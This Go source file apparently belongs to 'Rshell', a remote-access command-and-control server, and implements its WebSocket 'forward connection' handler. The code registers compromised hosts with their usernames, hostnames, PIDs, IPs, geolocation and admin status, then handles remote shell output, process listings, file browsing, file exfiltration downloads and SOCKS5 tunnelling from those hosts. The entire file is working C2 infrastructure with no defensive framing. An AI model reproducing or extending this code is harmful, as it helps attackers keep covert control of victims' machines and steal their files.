package websocket

import (
	"Rshell/pkg/command"
	"Rshell/pkg/connection"
	"Rshell/pkg/connection/base"
	"Rshell/pkg/database"
	"Rshell/pkg/encrypt"
	"Rshell/pkg/interactive"
	"Rshell/pkg/logger"
	"Rshell/pkg/qqwry"
	"Rshell/pkg/utils"
	"Rshell/pkg/webhooks"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/net/proxy"
)

// ForwardConfig 正向连接配置
type ForwardConfig struct {
	ServerURL   string            // WebSocket服务器地址 ws:// 或 wss://
	Socks5Proxy string            // SOCKS5代理地址 如: 127.0.0.1:1080
	Auth        map[string]string // 认证信息 (如果需要)
	Headers     map[string]string // 自定义请求头
	Timeout     time.Duration     // 连接超时时间
	MaxRetries  int               // 最大重试次数
	RetryDelay  time.Duration     // 重试延迟
	Reconnect   bool              // 是否自动重连
}

// ForwardConnector 正向连接器
type ForwardConnector struct {
	Config         *ForwardConfig
	client         *WSClient
	retryCount     int
	reconnectMu    sync.RWMutex
	isReconnecting bool
	stopReconnect  chan struct{}
}

// NewForwardConnector 创建新的正向连接器
func NewForwardConnector(config *ForwardConfig) *ForwardConnector {
	if config.Timeout == 0 {
		config.Timeout = 30 * time.Second
	}
	if config.MaxRetries == 0 {
		config.MaxRetries = 3
	}
	if config.RetryDelay == 0 {
		config.RetryDelay = 5 * time.Second
	}

	return &ForwardConnector{
		Config:        config,
		stopReconnect: make(chan struct{}),
	}
}

// connectWithProxy 通过SOCKS5代理建立WebSocket连接
func (fc *ForwardConnector) connectWithProxy() (*websocket.Conn, error) {
	// 解析服务器URL
	u, err := url.Parse(fc.Config.ServerURL)
	if err != nil {
		return nil, fmt.Errorf("failed to parse server URL: %w", err)
	}

	// 创建SOCKS5拨号器
	dialer, err := proxy.SOCKS5("tcp", fc.Config.Socks5Proxy, nil, &net.Dialer{
		Timeout: fc.Config.Timeout,
	})
	if err != nil {
		return nil, fmt.Errorf("failed to create SOCKS5 dialer: %w", err)
	}

	// 创建WebSocket拨号器
	wsDialer := &websocket.Dialer{
		NetDial: func(network, addr string) (net.Conn, error) {
			return dialer.Dial(network, addr)
		},
		HandshakeTimeout: fc.Config.Timeout,
	}

	// 设置请求头
	header := make(http.Header)
	for key, value := range fc.Config.Headers {
		header.Set(key, value)
	}

	// 添加认证信息
	if fc.Config.Auth != nil {
		if username, ok := fc.Config.Auth["username"]; ok {
			if password, ok := fc.Config.Auth["password"]; ok {
				header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(username+":"+password)))
			}
		}
	}

	// 建立WebSocket连接
	conn, _, err := wsDialer.Dial(u.String(), header)
	if err != nil {
		return nil, fmt.Errorf("failed to dial WebSocket: %w", err)
	}

	return conn, nil
}

// connectDirect 直接连接（无代理）
func (fc *ForwardConnector) connectDirect() (*websocket.Conn, error) {
	// 创建WebSocket拨号器
	wsDialer := &websocket.Dialer{
		HandshakeTimeout: fc.Config.Timeout,
	}

	// 设置请求头
	header := make(http.Header)
	for key, value := range fc.Config.Headers {
		header.Set(key, value)
	}

	// 添加认证信息
	if fc.Config.Auth != nil {
		if username, ok := fc.Config.Auth["username"]; ok {
			if password, ok := fc.Config.Auth["password"]; ok {
				header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(username+":"+password)))
			}
		}
	}

	// 建立WebSocket连接
	conn, _, err := wsDialer.Dial(fc.Config.ServerURL, header)
	if err != nil {
		return nil, fmt.Errorf("failed to dial WebSocket: %w", err)
	}

	return conn, nil
}

// Connect 建立正向连接
// Connect 建立正向连接 - 修改后
func (fc *ForwardConnector) Connect() (*WSClient, error) {
	var conn *websocket.Conn
	var err error

	// 根据配置选择连接方式
	if fc.Config.Socks5Proxy != "" {
		conn, err = fc.connectWithProxy()
	} else {
		conn, err = fc.connectDirect()
	}

	if err != nil {
		return nil, err
	}

	// 获取对方的IP地址
	remoteAddr := fc.getRemoteAddr(conn)

	// 创建临时UID（等待FirstBlood消息后更新）
	// 使用连接信息+时间戳生成临时ID
	tempUID := generateTempUID(remoteAddr)

	// 创建WSClient（复用原有的结构）
	client := &WSClient{
		Conn:          conn,
		UID:           tempUID, // 临时UID，等待FirstBlood更新
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
	}

	// 保存客户端引用
	fc.client = client
	fc.retryCount = 0

	// 设置连接参数
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// 启动Ping定时器
	client.PingTicker = time.NewTicker(30 * time.Second)
	go client.startPing()

	logger.Info("Forward WebSocket connection established to:", fc.Config.ServerURL, "Remote IP:", remoteAddr)

	// 启动消息处理协程
	go fc.handleMessages()

	// 如果需要自动重连，启动重连监听
	if fc.Config.Reconnect {
		go fc.startReconnectListener()
	}

	return client, nil
}

// getRemoteAddr 获取对方的IP地址
func (fc *ForwardConnector) getRemoteAddr(conn *websocket.Conn) string {
	// 尝试从底层连接获取远程地址
	if conn != nil && conn.UnderlyingConn() != nil {
		if tcpConn, ok := conn.UnderlyingConn().(*net.TCPConn); ok {
			remoteAddr := tcpConn.RemoteAddr()
			if remoteAddr != nil {
				// 获取IP部分，去除端口
				if host, _, err := net.SplitHostPort(remoteAddr.String()); err == nil {
					return host
				}
				return remoteAddr.String()
			}
		}
	}

	// 如果无法获取，尝试从服务器URL中提取
	if u, err := url.Parse(fc.Config.ServerURL); err == nil {
		return u.Hostname()
	}

	return "unknown"
}

// generateTempUID 生成临时UID
func generateTempUID(remoteAddr string) string {
	timestamp := time.Now().UnixNano()
	return fmt.Sprintf("temp_%s_%d", remoteAddr, timestamp)
}

// handleMessages 处理接收到的消息 - 修复断开连接处理
func (fc *ForwardConnector) handleMessages() {
	defer func() {
		if r := recover(); r != nil {
			logger.Error("Forward message handler panic recovered:", r)
		}
	}()

	for {
		if fc.client == nil || fc.client.IsClosed {
			break
		}

		messageType, message, err := fc.client.Conn.ReadMessage()
		if err != nil {
			// 检查是否为正常关闭
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				logger.Info("Forward WebSocket closed unexpectedly:", err, "for client:", fc.client.UID)
			} else if websocket.IsCloseError(err, websocket.CloseNormalClosure, websocket.CloseGoingAway) {
				logger.Info("Forward WebSocket closed normally for client:", fc.client.UID)
				break // 正常关闭，不需要重连
			} else {
				logger.Error("Forward WebSocket read error:", err, "for client:", fc.client.UID)
			}

			// 如果开启了自动重连，标记为需要重连
			if fc.shouldReconnect() {
				fc.handleDisconnect()
			}
			break
		}

		// 只处理二进制消息
		if messageType != websocket.BinaryMessage {
			logger.Warn("Received non-binary message in forward connection, ignoring from client:", fc.client.UID)
			continue
		}

		// 处理消息
		fc.forwardMessageToHandler(message)
	}
}

// forwardMessageToHandler 将消息转发给原有的处理逻辑
func (fc *ForwardConnector) forwardMessageToHandler(message []byte) {
	// 这里需要根据你的实际需求来处理
	// 你可以复用HandleWebSocket中的消息处理逻辑
	// 或者创建一个假的http.Request来调用HandleWebSocket

	// 简单示例：直接复用消息处理的核心逻辑
	if len(message) < 4 {
		logger.Error("Message too short in forward connection")
		return
	}

	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)

	switch msgType {
	case 1: // firstBlood
		if len(message) < 5 { // 至少需要类型+1字节数据
			logger.Error("FirstBlood message too short")
			break
		}

		msg := message[4:]
		if len(msg) == 0 {
			logger.Error("Empty FirstBlood payload")
			break
		}

		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			logger.Error("DecodeBase64 failed:", err)
			break
		}

		metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
		if err != nil {
			logger.Error("Decrypt failed:", err)
			break
		}

		// 验证metainfo长度
		if len(metainfo) < 9 {
			logger.Error("Metainfo too short:", len(metainfo))
			break
		}

		uid := encrypt.BytesToMD5(metainfo)

		// 更新客户端UID
		oldUID := fc.client.UID
		fc.client.UID = uid
		fc.client.LastHeartbeat = time.Now()
		fc.client.TimeoutCount = 0

		// 添加UID映射，用于处理临时UID到正式UID的转换
		connection.GlobalUIDMapper.AddMapping(oldUID, uid)

		// 从全局管理器中移除旧的临时客户端
		globalClientManager.Remove(oldUID)

		// 添加到全局管理器（使用新的UID）
		globalClientManager.Add(uid, fc.client)

		// 更新连接类型
		connection.MuClientListenerType.Lock()
		delete(connection.ClientListenerType, oldUID) // 删除旧的
		connection.ClientListenerType[uid] = "websocket"
		connection.MuClientListenerType.Unlock()

		// 启动心跳检查
		fc.client.HeartbeatTicker = time.NewTicker(10 * time.Second)
		go fc.client.startHeartbeatCheck()

		// 获取对方IP（从服务器URL中获取）
		externalIp := fc.getServerIP()

		// 检查客户端是否已存在
		var existingClient database.Clients
		exists, _ := database.Engine.Where("uid = ?", uid).Get(&existingClient)

		if !exists { // FirstBlood
			// 安全解析数据
			if len(metainfo) < 9 {
				logger.Error("Metainfo too short for parsing")
				break
			}

			publicKey := metainfo[:32]
			metainfo = metainfo[32:]
			processID := binary.BigEndian.Uint32(metainfo[:4])
			flag := int(metainfo[4])
			ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
			localIP := utils.Uint32ToIP(ipInt).String()

			// 安全获取osInfo
			var osInfo string
			if len(metainfo) > 9 {
				osInfo = string(metainfo[9:])
			}

			// 使用安全分割函数
			hostName, UserName, processName := base.SafeSplitOSInfo(osInfo)

			// 如果外部IP未知，使用本地IP
			if externalIp == "unknown" || externalIp == "" {
				externalIp = localIP
			}

			// 验证IP地址
			if net.ParseIP(externalIp) == nil {
				externalIp = "0.0.0.0"
			}

			// 获取地理位置
			address, _ := qqwry.GetLocationByIP(externalIp)

			currentTime := time.Now()
			timeFormat := "01-02 15:04"
			formattedTime := currentTime.Format(timeFormat)

			arch := "x86"

			if flag > 8 {
				UserName += "*"
				flag = flag - 8
			}
			if flag > 4 {
				arch = "x64"
			}

			// 创建新客户端记录
			c := database.Clients{
				Uid:        uid,
				FirstStart: formattedTime,
				ExternalIP: externalIp, // 使用获取到的IP
				InternalIP: localIP,
				Username:   UserName,
				Computer:   hostName,
				Process:    processName,
				Pid:        strconv.Itoa(int(processID)),
				Address:    address,
				Arch:       arch,
				Note:       "",
				Sleep:      "0",
				Online:     "1",
				Color:      "",
				PublicKey:  base64.StdEncoding.EncodeToString(publicKey[:]),
			}
			encrypt.PublicKeyMap[uid] = base64.StdEncoding.EncodeToString(publicKey[:])
			database.Engine.Insert(&c)
			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
			database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})

			// 发送Webhook通知
			go webhooks.NotifyOnline(c)

			logger.Info("New client registered via forward connection:", uid, "IP:", externalIp)
		} else {
			// 更新在线状态
			database.Engine.Where("uid = ?", uid).Update(&database.Clients{Online: "1"})
			logger.Info("Client reconnected via forward connection:", uid)
		}

	case 2: // otherMsg
		if len(message) < 8 { // 至少需要类型+4字节长度+部分数据
			logger.Error("OtherMsg message too short")
			break
		}

		msg := message[4:]
		if len(msg) < 4 {
			logger.Error("OtherMsg too short")
			break
		}

		metaLen := binary.BigEndian.Uint32(msg[:4])

		// 验证metaLen的合理性
		if metaLen > uint32(len(msg)-4) {
			logger.Error("Invalid meta length:", metaLen, "available:", len(msg)-4)
			break
		}

		if metaLen == 0 {
			logger.Error("Zero meta length")
			break
		}

		metaMsg := msg[4 : 4+metaLen]
		realMsg := msg[4+metaLen:]

		// 验证realMsg不为空
		if len(realMsg) == 0 {
			logger.Error("Empty real message")
			break
		}

		tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
		if err != nil {
			logger.Error("DecodeBase64 failed:", err)
			break
		}

		metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
		if err != nil {
			logger.Error("Decrypt failed:", err)
			break
		}

		uid := encrypt.BytesToMD5(metainfo)

		// 检查客户端是否在线
		if _, exists := globalClientManager.Get(uid); !exists {
			logger.Warn("Received message from offline client:", uid)
			break
		}

		dataBytes, err := encrypt.DecodeBase64(realMsg)
		if err != nil {
			logger.Error("DecodeBase64 failed:", err)
			break
		}

		dataBytes, err = encrypt.Decrypt(dataBytes, uid)
		if err != nil {
			logger.Error("First decrypt failed:", err)
			break
		}

		dataBytes, err = encrypt.Decrypt(dataBytes, uid)
		if err != nil {
			logger.Error("Second decrypt failed:", err)
			break
		}

		// 严格检查dataBytes长度
		if len(dataBytes) < 4 {
			logger.Error("Decrypted data too short:", len(dataBytes))
			break
		}

		replyTypeBytes := dataBytes[:4]
		data := dataBytes[4:]
		replyType := binary.BigEndian.Uint32(replyTypeBytes)

		switch replyType {
		case 0: // 命令行展示
			var shell database.Shell
			if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
				// 限制数据长度，防止过大的日志
				var content string
				if len(data) > 10000 {
					content = string(data[:10000]) + "\n[Data truncated...]"
				} else {
					content = string(data) + "\n"
				}

				shell.ShellContent += content
				database.Engine.Where("uid = ?", uid).Update(&shell)
			}

		case 31: // 错误展示
			var shell database.Shell
			if _, err := database.Engine.Where("uid = ?", uid).Get(&shell); err == nil {
				// 限制数据长度，防止过大的日志
				var content string
				if len(data) > 10000 {
					content = string(data[:10000]) + "\n[Data truncated...]"
				} else {
					content = string(data)
				}

				shell.ShellContent += "!Error: " + content + "\n"
				database.Engine.Where("uid = ?", uid).Update(&shell)
			}

		case command.PS:
			if len(data) > 0 {
				command.VarPidQueue.Add(uid, string(data))
			}

		case command.FileBrowse:
			if len(data) > 0 {
				command.VarFileBrowserQueue.Add(uid, string(data))
			}

		case 22: // 文件下载第一条信息
			if len(data) < 8 { // 至少4字节长度+部分路径
				logger.Error("File download info too short")
				break
			}

			fileLen := int(binary.BigEndian.Uint32(data[:4]))
			if len(data) < 5 { // 至少4字节长度+1字节路径
				logger.Error("No file path in download info")
				break
			}

			filePath := string(data[4:])
			if filePath == "" {
				logger.Error("Empty file path")
				break
			}

			// 验证文件长度合理性
			if fileLen <= 0 {
				logger.Error("Invalid file length:", fileLen)
				break
			}

			// 使用安全路径函数
			fullPath, err := utils.GetSafeFilePath(uid, filePath)
			if err != nil {
				logger.Error("Security check failed:", err)
				break
			}

			// 确保下载目录存在
			downloadDir := filepath.Dir(fullPath)
			if err := os.MkdirAll(downloadDir, 0755); err != nil {
				logger.Error("Failed to create download directory:", err)
				break
			}

			// 更新数据库
			sql := `
UPDATE downloads
SET file_size = ?, downloaded_size = ?
WHERE uid = ? AND file_path = ?;
`
			_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
			if err != nil {
				logger.Error("Database update failed:", err)
			}

			// 检查并删除已存在的文件
			if _, err := os.Stat(fullPath); err == nil {
				if err := os.Remove(fullPath); err != nil {
					logger.Error("Failed to remove existing file:", err)
					break
				}
			}

			// 创建新文件
			fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
			if err != nil {
				logger.Error("Failed to create file:", err)
				break
			}
			fp.Close()

		case command.DOWNLOAD: // 文件下载
			if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
				logger.Error("Download data too short")
				break
			}

			filePathLen := int(binary.BigEndian.Uint32(data[:4]))
			if len(data) < 4+filePathLen {
				logger.Error("Invalid file path length in download")
				break
			}

			if filePathLen == 0 {
				logger.Error("Zero file path length")
				break
			}

			filePath := string(data[4 : 4+filePathLen])
			fileContent := data[4+filePathLen:]

			// 使用安全路径函数
			fullPath, err := utils.GetSafeFilePath(uid, filePath)
			if err != nil {
				logger.Error("Security check failed:", err)
				break
			}
			utils.Filelock.Lock()
			var fileDownloads database.Downloads
			if _, err := database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Get(&fileDownloads); err == nil {
				fileDownloads.DownloadedSize += len(fileContent)
				database.Engine.Where("uid = ? AND file_path = ?", uid, filePath).Update(&fileDownloads)
			}
			utils.Filelock.Unlock()

			// 确保目录存在
			downloadDir := filepath.Dir(fullPath)
			if err := os.MkdirAll(downloadDir, 0755); err != nil {
				logger.Error("Failed to create download directory:", err)
				break
			}

			// 追加文件内容
			fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			if err != nil {
				logger.Error("Failed to open file:", err)
				break
			}

			if _, err := fp.Write(fileContent); err != nil {
				logger.Error("Failed to write file content:", err)
			}
			fp.Close()

		case command.DRIVES:
			if len(data) > 0 {
				drives := utils.GetExistingDrives(data)
				command.VarDrivesQueue.Add(uid, drives)
			}

		case command.FileContent:
			if len(data) < 8 { // 至少4字节路径长度+部分路径+部分内容
				logger.Error("File content data too short")
				break
			}

			filePathLen := int(binary.BigEndian.Uint32(data[:4]))
			if len(data) < 4+filePathLen {
				logger.Error("Invalid file path length in file content")
				break
			}

			if filePathLen == 0 {
				logger.Error("Zero file path length")
				break
			}

			filePath := string(data[4 : 4+filePathLen])
			fileContent := data[4+filePathLen:]
			command.VarFileContentQueue.Add(uid, filePath, string(fileContent))

		case command.Socks5Data:
			if len(data) < 16 {
				logger.Error("Socks5 data too short")
				break
			}

			md5sign := data[:16]
			rawData := data[16:]
			command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
		case command.WriteInteractieShell:
			sessionIDLen := int(binary.BigEndian.Uint32(data[:4]))

			sessionID := string(data[4 : 4+sessionIDLen])
			output := data[4+sessionIDLen:]

			interactive.SendOutputToSession(uid, sessionID, output)
		default:
			logger.Warn("Unknown reply type:", replyType)
		}

	case 3: // heartBeat
		if len(message) < 5 { // 至少需要类型+1字节数据
			logger.Error("HeartBeat message too short")
			break
		}

		msg := message[4:]
		if len(msg) == 0 {
			logger.Error("Empty HeartBeat payload")
			break
		}

		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			logger.Error("DecodeBase64 failed:", err)
			break
		}

		metainfo, err := encrypt.DecryptNormal(tmpMetainfo)
		if err != nil {
			logger.Error("Decrypt failed:", err)
			break
		}

		uid := encrypt.BytesToMD5(metainfo)

		// 更新心跳时间
		if c, exists := globalClientManager.Get(uid); exists && !c.IsClosed {
			c.LastHeartbeat = time.Now()
			c.TimeoutCount = 0
		}

	default:
		logger.Warn("Unknown message type:", msgType)
	}
}

// getServerIP 从服务器URL中获取IP
func (fc *ForwardConnector) getServerIP() string {
	if fc.Config.ServerURL == "" {
		return "unknown"
	}

	// 解析URL
	u, err := url.Parse(fc.Config.ServerURL)
	if err != nil {
		return "unknown"
	}

	// 获取主机名
	host := u.Hostname()

	// 尝试解析为主机名或IP
	if net.ParseIP(host) != nil {
		return host // 已经是IP
	}

	// 如果是域名，尝试解析
	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return host // 返回域名
	}

	// 返回第一个IPv4地址
	for _, ip := range ips {
		if ip.To4() != nil {
			return ip.String()
		}
	}

	// 如果没有IPv4，返回第一个IPv6
	if len(ips) > 0 {
		return ips[0].String()
	}

	return host
}

// handleDisconnect 处理断开连接
func (fc *ForwardConnector) handleDisconnect() {
	fc.reconnectMu.Lock()

	// 如果已经在重连中，直接返回
	if fc.isReconnecting {
		fc.reconnectMu.Unlock()
		return
	}

	// 标记为重连状态
	fc.isReconnecting = true
	fc.reconnectMu.Unlock()

	// 异步执行重连
	go fc.reconnect()
}

// shouldReconnect 检查是否应该重连
func (fc *ForwardConnector) shouldReconnect() bool {
	if !fc.Config.Reconnect {
		return false
	}

	// 如果已经超过最大重试次数，不再重连
	if fc.retryCount >= fc.Config.MaxRetries {
		return false
	}

	return true
}

// reconnect 重新连接
// reconnect 重新连接 - 修复版
func (fc *ForwardConnector) reconnect() {
	defer func() {
		fc.reconnectMu.Lock()
		fc.isReconnecting = false
		fc.reconnectMu.Unlock()
	}()

	logger.Info(fmt.Sprintf("Starting reconnection process for forward client (attempt %d/%d)...",
		fc.retryCount+1, fc.Config.MaxRetries))

	for attempt := 1; attempt <= fc.Config.MaxRetries; attempt++ {
		select {
		case <-fc.stopReconnect:
			logger.Info("Reconnection stopped by user for forward client")
			return
		default:
			// 更新重试计数
			fc.retryCount = attempt

			logger.Info(fmt.Sprintf("Attempting to reconnect forward client (attempt %d/%d)...",
				attempt, fc.Config.MaxRetries))

			// 等待重试延迟（第一次尝试前等待）
			if attempt > 1 {
				time.Sleep(fc.Config.RetryDelay)
			}

			// 尝试重新连接
			err := fc.attemptReconnect()
			if err == nil {
				// 连接成功，重置计数器
				fc.retryCount = 0
				logger.Info("Forward client reconnected successfully")
				return
			}

			logger.Warn(fmt.Sprintf("Reconnection attempt %d failed: %v", attempt, err))

			// 如果是最后一次尝试，记录错误并返回
			if attempt == fc.Config.MaxRetries {
				logger.Error(fmt.Sprintf("Max reconnection attempts (%d) reached for forward client. Giving up.",
					fc.Config.MaxRetries))
				return
			}
		}
	}
}

// attemptReconnect 尝试重新建立连接
func (fc *ForwardConnector) attemptReconnect() error {
	var conn *websocket.Conn
	var err error

	if fc.Config.Socks5Proxy != "" {
		conn, err = fc.connectWithProxy()
	} else {
		conn, err = fc.connectDirect()
	}

	if err != nil {
		return fmt.Errorf("failed to reconnect: %w", err)
	}

	// 重新初始化客户端
	remoteAddr := fc.getRemoteAddr(conn)

	// 如果没有UID，生成临时UID
	tempUID := fc.client.UID
	if tempUID == "" {
		tempUID = generateTempUID(remoteAddr)
	}

	// 创建新的WSClient
	client := &WSClient{
		Conn:          conn,
		UID:           tempUID,
		StopChan:      make(chan struct{}),
		LastHeartbeat: time.Now(),
		IsClosed:      false,
	}

	// 更新客户端引用
	fc.client = client

	// 设置连接参数
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	// 启动Ping定时器
	client.PingTicker = time.NewTicker(30 * time.Second)
	go client.startPing()

	// 启动消息处理协程
	go fc.handleMessages()

	logger.Info("Forward WebSocket reconnection established to:", fc.Config.ServerURL,
		"Remote IP:", remoteAddr, "UID:", tempUID)

	return nil
}

// startReconnectListener 启动重连监听
func (fc *ForwardConnector) startReconnectListener() {
	// 监听客户端的关闭状态
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			if fc.client != nil && fc.client.IsClosed && fc.Config.Reconnect {
				fc.handleDisconnect()
			}
		case <-fc.stopReconnect:
			return
		}
	}
}

// Close 关闭正向连接器
func (fc *ForwardConnector) Close() {
	close(fc.stopReconnect)

	if fc.client != nil {
		// 从全局管理器移除
		globalClientManager.Remove(fc.client.UID)
	}
}

// StartForwardClient 启动正向客户端的便捷函数
func StartForwardClient(config *ForwardConfig) (*WSClient, error) {
	connector := NewForwardConnector(config)
	return connector.Connect()
}
